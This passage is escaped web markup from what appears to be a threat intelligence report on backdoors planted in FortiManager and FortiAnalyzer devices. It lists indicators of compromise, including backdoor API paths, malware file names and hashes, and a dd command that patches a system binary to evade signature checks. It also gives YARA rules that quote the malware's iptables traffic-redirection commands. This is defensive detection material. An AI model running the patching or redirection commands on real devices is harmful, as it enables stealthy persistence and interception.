#000000;padding:16px;width:10.581%;height:99.1875px\"\u003e\n\u003cp\u003eURI\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:99.1875px\"\u003e\n\u003cp\u003e/p/util/show_device_info\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:99.1875px\"\u003e\n\u003cp\u003eAn API call which created by the threat actor which acted as a persistent backdoor on FortiManager devices\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:99.1875px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:99.1875px\"\u003e\n\u003cp\u003eURI\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:99.1875px\"\u003e\n\u003cp\u003e/p/utils/fortigate_syslog_send\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:99.1875px\"\u003e\n\u003cp\u003eAn API call which created by the threat actor which acted as a persistent backdoor on FortiAnalyzer devices\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:143.979px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:143.979px\"\u003e\n\u003cp\u003ePython Function\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:143.979px\"\u003e\n\u003cp\u003eget_device_info\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:143.979px\"\u003e\n\u003cp\u003eA malicious python function added to /usr/local/lib/python3.8/proj/util/views.py on FortiAnalyzer and FortiManager devices which provided threat actors with a persistent backdoor\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:121.583px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:121.583px\"\u003e\n\u003cp\u003eFilename\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:121.583px\"\u003e\n\u003cp\u003e/bin/support\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:121.583px\"\u003e\n\u003cp\u003eThreat actor script which launches /bin/auth (TABLEFLIP) and /bin/klogd (REPTILE) and deletes the two files along with /bin/support from disk\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:121.583px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:121.583px\"\u003e\n\u003cp\u003eFilename\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:121.583px\"\u003e\n\u003cp\u003e/bin/auth\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:121.583px\"\u003e\n\u003cp\u003eTABLEFLIP Sample - A passive utility to setup traffic redirection from a specific IP address destined to the FortiManager on TCP541 to another specified port.\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:76.7917px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:76.7917px\"\u003e\n\u003cp\u003eFilename\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:76.7917px\"\u003e\n\u003cp\u003e/bin/klogd\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:76.7917px\"\u003e\n\u003cp\u003eREPTILE - A backdoor utility that listens for a specialized packet for activation\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:143.979px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:143.979px\"\u003e\n\u003cp\u003eConfig Change\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:143.979px\"\u003e\n\u003cp\u003eprintf \u0026quot;t\u0026quot; | dd of\u003d/bin/smit bs\u003d1 count\u003d1 conv\u003dnotrunc seek\u003d22866 2\u0026gt;/dev/null\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:143.979px\"\u003e\n\u003cp\u003eConfig change made to /etc/init.d/localnet on FortiAnalyzer and FortiManager devices to revert a binary after it was modified to bypass digital signature verification of system files\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:121.583px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:121.583px\"\u003e\n\u003cp\u003eMD5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:121.583px\"\u003e\n\u003cp\u003e9ce2459168cf4b5af494776a70e0feda\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:121.583px\"\u003e\n\u003cp\u003eThreat actor script which launches /bin/auth (TABLEFLIP) and /bin/klogd (REPTILE) and deletes the two files along with /bin/support from disk\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eMD5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003eb6e92149efaf78e9ce7552297505b9d5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eTABLEFLIP sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eMD5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e53a69adac914808eced2bf8155a7512d\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eREPTILE variant  sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eMD5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003ea388ebaef45add5da503e4bf2b9da546\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eModified /bin/smit\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eMD5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e88711ebc99e1390f1ce2f42a6de0654d\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eLocalnet sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eMD5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003ee2d2884869f48f40b32fb27cc3bdefff\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eCASTLETAP sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eMD5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e53a69adac914808eced2bf8155a7512d\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eREPTILE variant sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eMD5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e64bdf7a631bc76b01b985f1d46b35ea6\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eTHINCRUST sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eMD5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003ea86a8fe875a89816e5808588154a067e\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eTHINCRUST sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eMD5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e3e43511c4f7f551290292394c4e21de7\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eRelated to THINCRUST\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:22.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:22.3958px\"\u003eSHA1\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:22.3958px\"\u003e86f3623b3fb8d5303b6c9d8295292a5c2ceb2889\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:22.3958px\"\u003eLocalnet sample\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA1\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e75c092098e3409d366a46fdde6a92ff97d29cee1\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eSmit sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA1\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e9dca7f1af5752bb007e5cc55acd2511f03049ee5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eTABLEFLIP sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA1\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e8c40fc87fa3b25a559585b10a8ca11c81fb09f75\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eCASTLETAP sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA1\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e3109b890901499f7ebb90f8870a7d1617d27e7c9\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eREPTILE variant sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA1\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003eb8bdaa1bd204a6c710875b0c4265655d1fd37d52\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003e/bin/support sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA1\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e1a077212735617a665a6b631e34a6aedcbc41713\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eTHINCRUST sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA1\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003ed5f8436e9815358e33b8243abda76c9b398943e2\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eTHINCRUST sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA1\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e8ef5159944d048fe84e51a818c9b11ebcfa98517\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eRelated to THINCRUST\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA256\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e245e4646e5d984c2da4cfe223bb2fae679441bcf42b254fc193ae97dc32af7ad\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eLocalnet sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA256\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e9fb09fe6db61fbdd19ac9c368e2f64fb9606119649830762fa467719c480ed44\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eSmit sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA256\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e18afbad17dee0e4330a85b782e8e580c6125d8a7127cda69ad0e2728d505a6f5\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eTABLEFLIP sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA256\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003ea00fed53b1ece4610c8b52934c20af3667d455f092a77f8d9bc46fdb9047e41a\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eCASTLETAP sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA256\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003eeb6af99148f0ce5b58e414162ff2b7567b4cf08953862a088996365ff306014b\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eREPTILE variant sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA256\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e33c22b2db8c0948c67204485972d2eb856e13dca16132371337fc3534e3df16d\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003e/bin/support sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA256\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003eabefe121e5c895bf63be80152ccbe2d7bb5ad985aa3ab989bcb7c0804b90d004\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eTHINCRUST sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA256\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e2266667af7532a32b9c21c330a9fe56356ca66610e39654804a7262f2af61017\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eTHINCRUST sample\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr style\u003d\"height:54.3958px\"\u003e\n\u003ctd colspan\u003d\"2\" style\u003d\"border:1px solid #000000;padding:16px;width:10.581%;height:54.3958px\"\u003e\n\u003cp\u003eSHA256\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:57.0582%;height:54.3958px\"\u003e\n\u003cp\u003e4e4c5e5ca588bd84b67a37b654ec522768fa83e535ff795a5c196da8f8b9737d\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px;width:32.3791%;height:54.3958px\"\u003e\n\u003cp\u003eRelated to THINCRUST\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003ch2\u003eYARA Rules\u003c/h2\u003e\n\u003cpre\u003e\u003ccode\u003erule M_Hunting_Util_TABLEFLIP_1\r\n{\r\nmeta:\r\n    author \u003d \u0026quot;Mandiant\u0026quot;\r\n    description \u003d \u0026quot;Looks for TABLEFLIP Binary\u0026quot;\r\n    md5 \u003d \u0026quot;b6e92149efaf78e9ce7552297505b9d5\u0026quot;\r\nstrings:\r\n    $z1 \u003d \u0026quot;%1$s.*%2$d\u0026quot; fullword\r\n    $x1 \u003d \u0026quot;/proc/self/exe\u0026quot; fullword\r\n    $x2 \u003d \u0026quot;socket\u0026quot; fullword\r\n    $x3 \u003d \u0026quot;127.\u0026quot; fullword\r\n    $x4 \u003d \u0026quot;iptables -t nat\u0026quot; fullword\r\n    $s1 \u003d \u0026quot;iptables -t nat -S PREROUTING | grep %1$s | grep %2$d || iptables -t nat -A PREROUTING -p tcp -s %1$s --dport 541 -j REDIRECT --to-port %2$d\u0026quot;\r\n    $s2 \u003d \u0026quot;iptables -t nat -S PREROUTING | tail -n +2 | grep -n -E \u0026#39;%1$s.*%2$d\u0026#39; | awk -F: \u0026#39;{print $1}\u0026#39;| xargs iptables -t nat -D PREROUTING\u0026quot;\r\ncondition:\r\n    uint32(0) \u003d\u003d 0x464c457f and filesize \u0026lt; 5MB and @x1 \u0026lt;\u003d @x2 and @x2 \u0026lt;\u003d @x3 and @x3 \u0026lt;\u003d @x4 and ( $z1 or any of ($s*) )\r\n}\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode\u003erule M_Hunting_Backdoor_REPTILE_1\r\n{\r\n    meta:\r\n        author \u003d \u0026quot;Mandiant\u0026quot;\r\n        description \u003d \u0026quot;Looks for ELF backdoor REPTILE variant\u0026quot;\r\n        md5 \u003d \u0026quot;53a69adac914808eced2bf8155a7512d\u0026quot;\r\n    strings:\r\n        $x1 \u003d \u0026quot;;7(Zu9YTsA7qQ#vw\u0026quot;\r\n        $x2 \u003d \u0026quot;mznCvqSBo\u0026quot;\r\n        $x3 \u003d \u0026quot;hpaVAj2FJ\u0026quot;\r\n        $x4 \u003d \u0026quot;%d.%d.%d.%d\u0026quot;\r\n        $x5 \u003d \u0026quot;HISTFILE\u003d\u0026quot;\r\n        $x6 \u003d \u0026quot;TERM\u0026quot;\r\n        $x7 \u003d { 58 90 AE 86 F1 B9 1C F6 29 83 95 71 1D DE 58 0D } // taken from FE_Hunting_Linux_TINYSHELL_2_FEBeta.yara\r\n    condition:\r\n        uint32(0) \u003d\u003d 0x464c457f and all of them and #x4 \u0026gt;\u003d 3 and #x6 \u003d\u003d 1 and filesize \u0026lt; 15MB\r\n}\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode\u003erule M_Hunting_Backdoor_CASTLETAP_1\r\n{\r\n    meta:\r\n        author \u003d \u0026quot;Mandiant\u0026quot;\r\n        description \u003d \u0026quot;Finds strings observed in CASTLETOP ELF binary\u0026quot;\r\n        md5 \u003d \u0026quot;e2d2884869f48f40b32fb27cc3bdefff\u0026quot;\r\n    strings:\r\n        $x1 \u003d \u0026quot;;7(Zu9YTsA7qQ#vw\u0026quot;\r\n        $x2 \u003d \u0026quot;qWWlC0v6yYh2yxu\u0026quot;\r\n        $x3 \u003d \u0026quot;1qaz@WSXa\u0026quot;\r\n        $x4 \u003d \u0026quot;hpaVAj2FJ\u0026quot;\r\n        $x5 \u003d \u0026quot;%d.%d.%d.%d\u0026quot;\r\n        $x6 \u003d \u0026quot;HISTFILE\u003d\u0026quot;\r\n        $x7 \u003d \u0026quot;TERM\u0026quot;\r\n        $x8 \u003d \u0026quot;/tmp/busybox\u0026quot;\r\n        $x9 \u003d { 58 90 AE 86 F1 B9 1C F6 29 83 95 71 1D DE 58 0D }\r\n    condition:\r\n        uint16(18) \u003d\u003d 183 and\r\n        uint16(16) \u003d\u003d 0x02 and\r\n        uint32(0) \u003d\u003d 0x464c457f and 1 of ($x*) and #x5 \u0026gt;\u003d 3 and #x7 \u003d\u003d 1 and filesize \u0026lt; 15MB\r\n}\r\nrule M_Hunting_Backdoor_CASTLETAP_2\r\n{\r\n    meta:\r\n        author \u003d \u0026quot;Mandiant\u0026quot;\r\n        description \u003d \u0026quot;Finds byte pattern related to XOR decode function\u0026quot;\r\n        md5 \u003d \u0026quot;e2d2884869f48f40b32fb27cc3bdefff\u0026quot;\r\n    strings:\r\n        $x1 \u003d { ?? 14 40 B9 ?? B0 1D 11 ?? 10 40 B9 [5] 0C 40 B9 [5] 1F 80 52 [9] 1F 00 12 }\r\n    condition:\r\n        uint16(18) \u003d\u003d 183 and\r\n        uint16(16) \u003d\u003d 0x02 and\r\n        uint32(0) \u003d\u003d 0x464c457f and any of them and filesize \u0026lt; 15MB        \r\n}\u003c/code\u003e\u003c/pre\u003e"]]]],[["Threat Intelligence","Investigating FortiManager Zero-Day Exploitation (CVE-2024-47575)","Mandiant collaborated with 